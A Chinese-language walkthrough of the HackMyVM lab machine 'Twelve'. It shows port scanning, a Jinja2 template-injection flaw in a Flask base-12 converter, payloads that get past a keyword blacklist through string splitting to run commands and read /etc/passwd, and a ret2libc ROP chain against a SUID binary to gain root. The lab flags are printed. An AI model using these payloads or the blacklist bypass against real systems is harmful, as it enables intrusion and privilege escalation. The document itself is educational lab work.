---
Machine Name: Twelve
URL: https://hackmyvm.eu/machines/machine.php?vm=Twelve
OS: Linux
Virtualization: VirtualBox
Difficulty: Easy
---

这台机器一开始如果只扫默认端口，很容易被 80 上的 Apache 默认页带偏。实际关键入口在一个非标准 Web 端口上，所以这里先老老实实做全端口枚举。

先用 `fscan` 扫一下对外开放的端口：

```bash
PS C:\Users\SeanL> fscan -h 192.168.101.215

   ___                              _
  / _ \     ___  ___ _ __ __ _  ___| | __
 / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
/ /_\\_____\__ \ (__| | | (_| | (__|   <
\____/     |___/\___|_|  \__,_|\___|_|\_\
                     fscan version: 1.8.4
start infoscan
192.168.101.215:22 open
192.168.101.215:80 open
[*] alive ports len is: 2
start vulscan
[*] WebTitle http://192.168.101.215    code:200 len:10701  title:Apache2 Debian Default Page: It works
已完成 2/2
[*] 扫描结束,耗时: 11.7250594s
```

一开始只扫出了 `22` 和 `80`。其中 `80` 上只是 Apache 默认页，表面上看没什么信息。

这里如果停下就容易卡住，所以继续做一次全端口扫描：

```bash
PS C:\Users\SeanL> fscan -h 192.168.101.215 -p 1-65535 -no -t 1000 -time 1

start infoscan
192.168.101.215:25 open
192.168.101.215:143 open
192.168.101.215:110 open
192.168.101.215:80 open
192.168.101.215:22 open
192.168.101.215:1212 open
[*] alive ports len is: 6
start vulscan
[*] WebTitle http://192.168.101.215    code:200 len:10701  title:Apache2 Debian Default Page: It works
[*] WebTitle http://192.168.101.215:1212 code:200 len:2194   title:Base-12 Converter
已完成 6/6
[*] 扫描结束,耗时: 1m18.0657469s
```

这次多扫出来 `25`、`110`、`143` 和最关键的 `1212` 端口。其中 `1212` 跑了一个 Web 服务，标题是 `Base-12 Converter`，明显比默认页更值得关注。

访问 `1212` 端口看看页面：

```bash
curl http://192.168.101.215:1212/
```

页面是一个很简单的十进制转十二进制的小工具，参数是 GET 方式提交的 `num`。

正常输入一个数字测试一下：

```bash
curl "http://192.168.101.215:1212/?num=144"
```

返回结果是 `100`，说明功能正常。

再输入非法字符看看报错：

```bash
curl "http://192.168.101.215:1212/?num=abc"
```

返回类似：

```html
Error: 'abc' is not a valid integer
```

这里有一个值得注意的点，错误信息把我们提交的内容原样回显到了页面中。如果后端是 Flask/Jinja2 并且存在不安全模板渲染，就有可能打出 SSTI。

先用一个最经典的 Jinja2 测试 payload 验证一下：

```bash
curl "http://192.168.101.215:1212/?num=%7B%7B7*7%7D%7D"
```

页面返回：

```html
Error: '49' is not a valid integer
```

这就很明确了，`{{7*7}}` 被服务端模板执行成了 `49`，说明这里存在 **SSTI**，而且模板引擎就是 Jinja2。

继续测试一些对象，确认利用面：

```bash
curl "http://192.168.101.215:1212/?num=%7B%7Brequest%7D%7D"
curl "http://192.168.101.215:1212/?num=%7B%7Bcycler%7D%7D"
curl "http://192.168.101.215:1212/?num=%7B%7Blipsum%7D%7D"
curl "http://192.168.101.215:1212/?num=%7B%7Burl_for%7D%7D"
```

这些对象都能被解析出来，说明模板上下文里暴露了不少可用对象。

进一步测试时会发现站点做了一个黑名单拦截，比如这些关键词会触发告警：

```text
config
self
os
popen
read
import
write
flag
```

但这个黑名单只是简单的字符串匹配，拦的是我们输入的原始参数，而不是模板执行后的对象，所以可以通过字符串拼接和 `attr` 之类的方式绕过。

先尝试读取文件，验证我们是否已经能从 SSTI 进入到 Python 内建函数：

```bash
curl "http://192.168.101.215:1212/?num=%7B%7B(lipsum.__globals__.__builtins__%5B'open'%5D('/etc/passwd')%7Cattr('__iter__')()%7Cattr('__next__')())%7D%7D"
```

这里用的是：

```jinja2
{{(lipsum.__globals__.__builtins__['open']('/etc/passwd')|attr('__iter__')()|attr('__next__')())}}
```

思路是：

1. `lipsum.__globals__` 可以拿到 Jinja2 函数的全局命名空间。
2. 从中取 `__builtins__['open']` 打开文件。
3. 为了避免直接使用被拦截的 `read`，改用迭代器方式取第一行。

成功后会读出 `/etc/passwd` 的第一行，说明文件读取已经没问题了。

既然能读文件，优先读当前 Flask 应用源码，通常能直接看到漏洞成因和部署路径。先看看进程启动命令：

```bash
curl "http://192.168.101.215:1212/?num=%7B%7B(lipsum.__globals__.__builtins__%5B'open'%5D('/proc/self/cmdline').__iter__().__next__())%7D%7D"
```

从返回内容可以看出程序路径是：

```bash
/usr/bin/python3 /opt/twelve_app/app.py
```

于是直接读源码：

```bash
curl "http://192.168.101.215:1212/?num=%7B%7Blipsum.__globals__.__builtins__.open('/proc/self/cwd/app.py').read()%7D%7D"
```

源码核心逻辑大致如下：

```python
from flask import Flask, request, render_template_string

app = Flask(__name__)

def to_base12(n):
    if n == 0: return "0"
    chars = "0123456789AB"
    res = ""
    while n > 0:
        res = chars[n % 12] + res
        n //= 12
    return res

@app.route('/')
def index():
    number = request.args.get('num', '')
    if not number:
        return render_template_string(UI_TEMPLATE, content="<span class='text-slate-400'>Ready for input</span>")

    blacklist = ['config', 'self', 'os', 'popen', 'read', 'import', 'write', 'flag']
    if any(word in number.lower() for word in blacklist):
        msg = f"<span class='text-red-500'>Security Alert: Malicious string '{number}' detected</span>"
        return render_template_string(UI_TEMPLATE.replace('{{ content | safe }}', msg)), 403

    try:
        val = to_base12(int(number))
        return render_template_string(UI_TEMPLATE, content=f"<span class='text-blue-600 font-bold'>{val}</span>")
    except:
        msg = f"<span class='text-amber-600'>Error: '{number}' is not a valid integer</span>"
        return render_template_string(UI_TEMPLATE.replace('{{ content | safe }}', msg))
```

漏洞点已经非常清楚了：

1. 程序把用户输入 `number` 拼到了 `msg` 里面。
2. 然后将整个替换后的字符串再次交给 `render_template_string()` 渲染。
3. 所以我们输入的 `{{...}}` 会被当作模板表达式执行。
4. 黑名单只是字符串匹配，很容易绕过。

接下来就可以从 SSTI 直接拿命令执行。为了绕过黑名单，这里把 `os`、`popen`、`read` 这些敏感单词都拆开：

```jinja2
{{(lipsum.__globals__['o'+'s'].__dict__['po'+'pen']('id')|attr('re'+'ad')())}}
```

URL 编码后请求：

```bash
curl "http://192.168.101.215:1212/?num=%7B%7B(lipsum.__globals__%5B'o'%2B's'%5D.__dict__%5B'po'%2B'pen'%5D('id')%7Cattr('re'%2B'ad')())%7D%7D"
```

成功拿到执行结果：

```bash
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

说明已经拿到 `www-data` 权限的命令执行。

接下来先做本地枚举，看看有哪些用户、目录和潜在提权点：

```jinja2
{{(lipsum.__globals__['o'+'s'].__dict__['po'+'pen']('ls -la /home')|attr('re'+'ad')())}}
{{(lipsum.__globals__['o'+'s'].__dict__['po'+'pen']("cat /etc/passwd | tail -n +1 | grep /bin/bash")|attr('re'+'ad')())}}
```

得到的信息里可以看到系统存在一个普通用户 `debian`：

```bash
debian:x:1000:1000:Debian,,,:/home/debian:/bin/bash
```

然后枚举 `debian` 家目录：

```jinja2
{{(lipsum.__globals__['o'+'s'].__dict__['po'+'pen']('ls -la /home/debian')|attr('re'+'ad')())}}
```

返回：

```bash
total 24
drwxr-xr-x 2 debian debian 4096 Jan 30 10:12 .
drwxr-xr-x 4 root   root   4096 Jan 30 09:30 ..
-rw-r--r-- 1 debian debian  220 Jul 11  2023 .bash_logout
-rw-r--r-- 1 debian debian 3526 Jul 11  2023 .bashrc
-rw-r--r-- 1 debian debian  807 Jul 11  2023 .profile
-rw-r--r-- 1 root   root     44 Jan 30 10:12 user.txt
```

可以直接读取 `user.txt`：

```jinja2
{{(lipsum.__globals__['o'+'s'].__dict__['po'+'pen']('cat /home/debian/user.txt')|attr('re'+'ad')())}}
```

得到用户 flag：

```bash
flag{user-8453eaca1baf2ad1abc7c17615fb8b91}
```

接下来找提权。常规先看 SUID：

```jinja2
{{(lipsum.__globals__['o'+'s'].__dict__['po'+'pen']('find / -perm -4000 -type f 2>/dev/null')|attr('re'+'ad')())}}
```

结果里最显眼的是一个非系统自带的二进制：

```bash
/usr/local/bin/12
```

这个文件很可疑，再看一下权限：

```jinja2
{{(lipsum.__globals__['o'+'s'].__dict__['po'+'pen']('ls -la /usr/local/bin/12')|attr('re'+'ad')())}}
```

输出如下：

```bash
-rwsr-sr-x 1 root root 10240 Jan 30 09:53 /usr/local/bin/12
```

这是一个 **SUID + SGID** 程序，属主是 root，很明显就是提权点。

运行它看看交互：

```jinja2
{{(lipsum.__globals__['o'+'s'].__dict__['po'+'pen']('/usr/local/bin/12')|attr('re'+'ad')())}}
```

程序菜单如下：

```text
Welcome to an easy Return Oriented Programming challenge...
Menu:
1) Get libc address
2) Get address of a libc function
3) Nom nom r0p buffer to stack
4) Exit
```

这相当于作者直接告诉我们这是个 ROP 题。

进一步测试选项：

```bash
printf '1\n4\n' | /usr/local/bin/12
printf '2\nsystem\n4\n' | /usr/local/bin/12
```

可以得到：

1. 选项 `1` 可以泄露 `libc.so.6` 基址。
2. 选项 `2` 可以泄露指定 libc 函数地址，比如 `system`。
3. 选项 `3` 则会把我们输入的字节拷到栈上，明显是溢出点。

把二进制拉下来分析后，可以确认：

```bash
RELRO: No RELRO
Canary: No canary
NX: Enabled
PIE: Enabled
```

虽然开了 NX 和 PIE，但程序本身直接提供地址泄露，所以做 `ret2libc` 还是很轻松。

关键点如下：

1. 溢出函数把数据 `memcpy` 到 `rbp` 指向的位置。
2. 因为保存的返回地址就在 `saved rbp` 后面，所以覆盖到 RIP 的偏移只有 `8`。
3. 只要先泄露出 `system` 地址，就可以算出 libc 基址，再定位 `setuid(0)`、`/bin/sh` 和 ROP gadget。

这里我本地分析出的偏移如下：

```bash
system  offset: 0x4c330
setuid  offset: 0xd5370
/bin/sh offset: 0x196031
pop rdi; ret : 0x27725
ret          : 0x270c2
RIP offset   : 8
```

因此最终利用链就是：

```text
padding(8)
+ ret
+ pop rdi ; ret
+ 0
+ setuid
+ ret
+ pop rdi ; ret
+ /bin/sh
+ system
```

其中先调用 `setuid(0)` 是为了把有效 uid 彻底切到 root，再调用 `system("/bin/sh")` 起一个 root shell。

我这里直接写了一个利用脚本，通过 SSTI 命令执行在目标机本地跑这个 SUID 程序，自动泄露 `system`、计算偏移并完成溢出。核心思路如下：

```python
import re, struct, subprocess

SYSTEM_OFF = 0x4c330
SETUID_OFF = 0xd5370
BINSH_OFF  = 0x196031
POP_RDI_OFF = 0x27725
RET_OFF = 0x270c2

def p64(x):
    return struct.pack('<Q', x)

p = subprocess.Popen(['/usr/local/bin/12'], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)

# 菜单选择 2，泄露 system 地址
# 根据泄露值计算 libc_base / setuid / /bin/sh / gadget

payload = b'A' * 8
payload += p64(ret)
payload += p64(pop_rdi) + p64(0) + p64(setuid_addr)
payload += p64(ret)
payload += p64(pop_rdi) + p64(binsh_addr) + p64(system_addr)

# 菜单选择 3，送入 payload
# ROP 完成后进入 root shell
```

利用成功后执行：
```bash

id
cat /root/root.txt
```

最终得到：

```bash
uid=0(root) gid=33(www-data) groups=33(www-data)
flag{root-a6127743d7835b6b4dd8debe12e9879a}
```

另外程序执行完成后还吐出了一个额外信息：

```bash
[rootpass: smokeylo]
```

虽然已经拿到 root 了，这个密码信息对解题不是必须的，但也顺手记录一下。

最后整理一下整条利用链：

1. 初始扫描只看到 `22/80`，容易误判。
2. 全端口扫描发现 `1212` 上还有一个 Flask Web 服务。
3. `num` 参数被拼入 `render_template_string()`，导致 Jinja2 SSTI。
4. 黑名单只是简单字符串过滤，可以通过字符串拼接绕过。
5. 通过 SSTI 拿到 `www-data` 命令执行。
6. 读取 `/home/debian/user.txt` 拿到 user flag。
7. 枚举到 SUID 程序 `/usr/local/bin/12`。
8. 该程序本身是一个简单 ROP 题，可泄露 libc 地址并存在栈溢出。
9. 构造 `setuid(0) -> system('/bin/sh')` 的 ret2libc 链完成提权。
10. 读取 `/root/root.txt` 拿到 root flag。

最终 flags：

```bash
user: flag{user-8453eaca1baf2ad1abc7c17615fb8b91}
root: flag{root-a6127743d7835b6b4dd8debe12e9879a}
```
